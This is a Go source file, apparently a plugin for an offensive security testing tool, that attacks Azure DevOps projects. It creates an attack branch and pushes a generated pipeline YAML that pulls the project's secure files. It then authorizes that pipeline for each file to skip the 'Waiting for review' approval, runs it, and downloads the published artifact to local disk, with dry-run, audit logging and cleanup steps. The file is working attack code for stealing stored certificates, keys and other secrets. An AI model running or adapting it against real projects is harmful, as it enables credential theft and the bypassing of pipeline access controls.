package extractsecurefiles

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/azuredevops"
	"github.com/praetorian-inc/trajan/pkg/azuredevops/attacks/common"
	"github.com/praetorian-inc/trajan/pkg/detections"
)

func init() {
	registry.RegisterAttackPlugin("azuredevops", "ado-extract-securefiles", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements secure file extraction via pipeline execution
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new extract secure files attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"ado-extract-securefiles",
			"Extract secure files via malicious pipeline",
			"azuredevops",
			attacks.CategorySecrets,
		),
	}
}

// CanAttack checks if extract secure files attack is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return common.FindingHasType(findings, detections.VulnSecretScopeRisk) ||
		common.FindingHasType(findings, detections.VulnPullRequestSecretsExposure)
}

// Execute performs the extract secure files attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Get ADO client
	client, err := common.GetADOClient(opts.Platform)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	result, err = p.executeWithClient(ctx, client, opts)
	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, err
}

// executeWithClient performs the attack with an injected client (for testing)
func (p *Plugin) executeWithClient(ctx context.Context, client *azuredevops.Client, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Parse project/repo from target value
	project, repo, err := common.ParseProjectRepo(opts.Target.Value)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Get optional secure file name from ExtraOpts (empty = download all)
	var fileName string
	if opts.ExtraOpts != nil {
		fileName = opts.ExtraOpts["file"]
	}

	branchName := fmt.Sprintf("trajan-extract-file-%s", opts.SessionID)
	pipelinePath := "azure-pipelines-extract-securefile.yml"

	if opts.DryRun {
		result.Success = true
		if fileName != "" {
			result.Message = fmt.Sprintf("[DRY RUN] Would extract secure file '%s' from %s/%s",
				fileName, project, repo)
		} else {
			result.Message = fmt.Sprintf("[DRY RUN] Would extract all secure files from %s/%s",
				project, repo)
		}
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Attack branch",
			},
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  pipelinePath,
				Description: "Secure file extraction pipeline",
			},
		}
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Action:      "delete",
				Description: "Delete attack branch",
			},
		}
		return result, nil
	}

	// List secure files
	secureFiles, err := client.ListSecureFiles(ctx, project)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list secure files: %v", err)
		return result, err
	}

	// Determine target files
	type targetFile struct {
		ID   string
		Name string
	}
	var targetFiles []targetFile
	var artifactName string
	var pipelineYAML string

	if fileName != "" {
		// Specific file requested — find it
		for _, sf := range secureFiles {
			if sf.Name == fileName {
				targetFiles = append(targetFiles, targetFile{ID: sf.ID, Name: sf.Name})
				break
			}
		}
		if len(targetFiles) == 0 {
			result.Success = false
			result.Message = fmt.Sprintf("secure file '%s' not found in project %s", fileName, project)
			return result, fmt.Errorf("secure file not found: %s", fileName)
		}
		artifactName = "extracted-secure-file"
		pipelineYAML = generateSecureFileYAML(fileName)
	} else {
		// No file specified — target ALL secure files
		if len(secureFiles) == 0 {
			result.Success = false
			result.Message = fmt.Sprintf("no secure files found in project %s", project)
			return result, fmt.Errorf("no secure files found in project %s", project)
		}
		for _, sf := range secureFiles {
			targetFiles = append(targetFiles, targetFile{ID: sf.ID, Name: sf.Name})
		}
		if len(targetFiles) == 1 {
			artifactName = "extracted-secure-file"
			pipelineYAML = generateSecureFileYAML(targetFiles[0].Name)
		} else {
			artifactName = "extracted-secure-files"
			fileNames := make([]string, len(targetFiles))
			for i, tf := range targetFiles {
				fileNames[i] = tf.Name
			}
			pipelineYAML = generateAllSecureFilesYAML(fileNames)
		}
	}

	// Get repository default branch
	repository, err := client.GetRepository(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get repository: %v", err)
		return result, err
	}

	defaultBranch := repository.DefaultBranch
	if defaultBranch == "" {
		defaultBranch = "refs/heads/main"
	}
	defaultBranch = strings.TrimPrefix(defaultBranch, "refs/heads/")

	// Get commit ID for default branch
	branches, err := client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var commitID string
	refName := "refs/heads/" + defaultBranch
	for _, branch := range branches {
		if branch.Name == refName {
			commitID = branch.ObjectID
			break
		}
	}

	if commitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find default branch: %s", defaultBranch)
		return result, fmt.Errorf("branch not found: %s", defaultBranch)
	}

	// Create attack branch
	err = client.CreateBranch(ctx, project, repo, branchName, commitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	branches, err = client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var newBranchCommitID string
	newRefName := "refs/heads/" + branchName
	for _, branch := range branches {
		if branch.Name == newRefName {
			newBranchCommitID = branch.ObjectID
			break
		}
	}

	if newBranchCommitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find new branch: %s", branchName)
		return result, fmt.Errorf("branch not found: %s", branchName)
	}

	// Push malicious pipeline YAML to branch
	commitMsg := "Add secure file extraction pipeline"
	err = client.PushFile(ctx, project, repo, branchName, pipelinePath, pipelineYAML, commitMsg, newBranchCommitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to push pipeline file: %v", err)
		return result, err
	}

	// Create pipeline definition pointing to the malicious YAML
	pipelineReq := azuredevops.CreatePipelineRequest{
		Name:   fmt.Sprintf("trajan-extract-securefile-%s", opts.SessionID),
		Folder: "\\",
	}
	pipelineReq.Configuration.Type = "yaml"
	pipelineReq.Configuration.Path = "/" + pipelinePath
	pipelineReq.Configuration.Repository.ID = repository.ID
	pipelineReq.Configuration.Repository.Type = "azureReposGit"

	pipeline, err := client.CreatePipeline(ctx, project, pipelineReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create pipeline: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
		Description: "Pipeline definition created",
	})

	// Authorize all target secure files for pipeline (bypass "Waiting for review")
	for _, tf := range targetFiles {
		if err := client.AuthorizePipelineResourceStr(ctx, project, "securefile", tf.ID, pipeline.ID); err != nil {
			fmt.Printf("Warning: failed to authorize pipeline %d for secure file %s (%s): %v\n",
				pipeline.ID, tf.Name, tf.ID, err)
		}
	}

	// Run the pipeline on the attack branch
	runReq := azuredevops.RunPipelineRequest{}
	runReq.Resources.Repositories = map[string]struct {
		RefName string `json:"refName"`
	}{
		"self": {RefName: "refs/heads/" + branchName},
	}

	run, err := client.RunPipeline(ctx, project, pipeline.ID, runReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to run pipeline: %v", err)
		return result, err
	}

	// Poll for pipeline completion
	var finalRun *azuredevops.PipelineRun
	for i := 0; i < 60; i++ {
		time.Sleep(5 * time.Second)
		finalRun, err = client.GetPipelineRun(ctx, project, pipeline.ID, run.ID)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to get pipeline run: %v", err)
			return result, err
		}
		if finalRun.State == "completed" {
			break
		}
	}

	if finalRun == nil || finalRun.State != "completed" {
		result.Success = false
		result.Message = fmt.Sprintf("pipeline run %d did not complete within timeout", run.ID)
		result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)
		return result, fmt.Errorf("pipeline timeout")
	}

	// Check pipeline result
	if finalRun.Result != "succeeded" {
		result.Success = false
		result.Message = fmt.Sprintf("pipeline run %d failed with result: %s", run.ID, finalRun.Result)
		result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)
		return result, nil
	}

	// Find matching build by definition ID
	builds, err := client.ListBuilds(ctx, project)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list builds: %v", err)
		result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)
		return result, err
	}

	var matchingBuildID int
	for _, b := range builds {
		if b.Definition.ID == pipeline.ID {
			matchingBuildID = b.ID
			break
		}
	}

	if matchingBuildID == 0 {
		result.Success = true
		result.Message = fmt.Sprintf("pipeline succeeded but no matching build found for definition %d", pipeline.ID)
		result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)
		return result, nil
	}

	// Get pipeline artifact with signed download URL
	// Pipeline Artifacts (PublishPipelineArtifact@1) require the Pipelines API, not Build Artifacts API
	pipelineArtifact, err := client.GetPipelineArtifact(ctx, project, pipeline.ID, run.ID, artifactName)
	if err != nil {
		result.Success = true
		result.Message = fmt.Sprintf("pipeline succeeded but artifact metadata fetch failed: %v", err)
		result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)
		return result, nil
	}

	if pipelineArtifact.SignedContent == nil || pipelineArtifact.SignedContent.URL == "" {
		result.Success = true
		result.Message = "pipeline succeeded but artifact has no signed download URL"
		result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)
		return result, nil
	}

	// Download from signed URL (pre-authenticated, no PAT needed)
	artifactData, err := common.DownloadFromSignedURL(pipelineArtifact.SignedContent.URL)
	if err != nil {
		result.Success = true
		result.Message = fmt.Sprintf("pipeline succeeded but artifact download failed: %v", err)
		result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)
		return result, nil
	}

	// Save to disk
	outputDir := filepath.Join(os.Getenv("HOME"), ".trajan", "extracted", opts.SessionID)
	if err := os.MkdirAll(outputDir, 0o700); err != nil {
		result.Success = true
		result.Message = fmt.Sprintf("artifact downloaded but failed to create output directory: %v", err)
		result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)
		return result, nil
	}

	// Try to extract files from zip (ADO wraps pipeline artifacts in a zip)
	extractedFiles, extractErr := common.ExtractFilesFromZip(artifactData)
	if extractErr != nil {
		// Not a zip or extraction failed — save raw
		outputPath := filepath.Join(outputDir, "artifact-raw")
		if err := os.WriteFile(outputPath, artifactData, 0o600); err != nil {
			result.Success = true
			result.Message = fmt.Sprintf("artifact downloaded but failed to write file: %v", err)
			result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)
			return result, nil
		}
		result.Success = true
		result.Message = fmt.Sprintf("Artifact downloaded (raw). Saved to: %s", outputPath)
	} else {
		var savedFiles []string
		for name, data := range extractedFiles {
			filePath := filepath.Join(outputDir, name)
			if err := os.WriteFile(filePath, data, 0o600); err != nil {
				fmt.Printf("Warning: failed to write %s: %v\n", name, err)
				continue
			}
			savedFiles = append(savedFiles, name)
		}
		if len(savedFiles) == 1 {
			result.Message = fmt.Sprintf("Secure file '%s' extracted successfully. Saved to: %s",
				savedFiles[0], filepath.Join(outputDir, savedFiles[0]))
		} else {
			result.Message = fmt.Sprintf("%d secure files extracted successfully. Saved to: %s",
				len(savedFiles), outputDir)
		}
	}

	result.Success = true
	fileNamesData := make([]string, len(targetFiles))
	for i, tf := range targetFiles {
		fileNamesData[i] = tf.Name
	}
	result.Data = map[string]interface{}{
		"branch":        branchName,
		"pipeline_path": pipelinePath,
		"pipeline_id":   pipeline.ID,
		"run_id":        run.ID,
		"build_id":      matchingBuildID,
		"file_names":    fileNamesData,
		"output_dir":    outputDir,
		"project":       project,
		"repo":          repo,
	}
	result.CleanupActions = buildCleanupActions(branchName, pipeline.ID)

	return result, nil
}

// buildCleanupActions creates cleanup actions for pipeline and branch
func buildCleanupActions(branchName string, pipelineID int) []attacks.CleanupAction {
	return []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactWorkflow,
			Identifier:  fmt.Sprintf("pipeline:%d", pipelineID),
			Action:      "delete",
			Description: "Delete pipeline definition",
		},
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
	}
}

// generateSecureFileYAML generates pipeline YAML for extracting a secure file via artifact
func generateSecureFileYAML(fileName string) string {
	return fmt.Sprintf(`trigger: none

pool:
  vmImage: 'ubuntu-latest'

steps:
  - task: DownloadSecureFile@1
    name: secureFile
    inputs:
      secureFile: '%s'
  - task: PublishPipelineArtifact@1
    inputs:
      targetPath: '$(Agent.TempDirectory)/%s'
      artifactName: 'extracted-secure-file'
    displayName: 'Publish Secure File as Artifact'
`, fileName, fileName)
}

// generateAllSecureFilesYAML generates pipeline YAML for extracting multiple secure files via artifact
func generateAllSecureFilesYAML(fileNames []string) string {
	var sb strings.Builder
	sb.WriteString("trigger: none\n\npool:\n  vmImage: 'ubuntu-latest'\n\nsteps:\n")

	// Download each secure file
	for i, name := range fileNames {
		fmt.Fprintf(&sb, "  - task: DownloadSecureFile@1\n    name: secureFile_%d\n    inputs:\n      secureFile: '%s'\n", i, name)
	}

	// Stage all files to a single directory
	sb.WriteString("  - script: |\n      mkdir -p $(Build.ArtifactStagingDirectory)/secure-files\n")
	for _, name := range fileNames {
		fmt.Fprintf(&sb, "      cp \"$(Agent.TempDirectory)/%s\" \"$(Build.ArtifactStagingDirectory)/secure-files/\"\n", name)
	}
	sb.WriteString("    displayName: 'Stage Secure Files'\n")

	// Publish all as one artifact
	sb.WriteString("  - task: PublishPipelineArtifact@1\n    inputs:\n      targetPath: '$(Build.ArtifactStagingDirectory)/secure-files'\n      artifactName: 'extracted-secure-files'\n    displayName: 'Publish Secure Files as Artifact'\n")

	return sb.String()
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	client, err := common.GetADOClient(session.Platform)
	if err != nil {
		return err
	}

	return p.cleanupWithClient(ctx, client, session)
}

// cleanupWithClient removes artifacts with an injected client (for testing)
func (p *Plugin) cleanupWithClient(ctx context.Context, client *azuredevops.Client, session *attacks.Session) error {
	project, repo, err := common.ParseProjectRepo(session.Target.Value)
	if err != nil {
		return err
	}

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case attacks.ArtifactWorkflow:
				// Parse pipeline ID from identifier "pipeline:<ID>"
				var pipelineID int
				if _, err := fmt.Sscanf(action.Identifier, "pipeline:%d", &pipelineID); err != nil {
					fmt.Printf("Failed to parse pipeline ID from %s: %v\n", action.Identifier, err)
					continue
				}

				if err := client.DeletePipeline(ctx, project, pipelineID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Pipeline %d already deleted or doesn't exist\n", pipelineID)
						continue
					}
					return fmt.Errorf("deleting pipeline %d: %w", pipelineID, err)
				}

			case attacks.ArtifactBranch:
				// Get branch commit ID for deletion
				branches, err := client.ListGitBranches(ctx, project, repo)
				if err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("listing branches for deletion: %w", err)
				}

				var commitID string
				refName := "refs/heads/" + action.Identifier
				for _, branch := range branches {
					if branch.Name == refName {
						commitID = branch.ObjectID
						break
					}
				}

				if commitID == "" {
					fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
					continue
				}

				if err := client.DeleteBranch(ctx, project, repo, action.Identifier, commitID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}
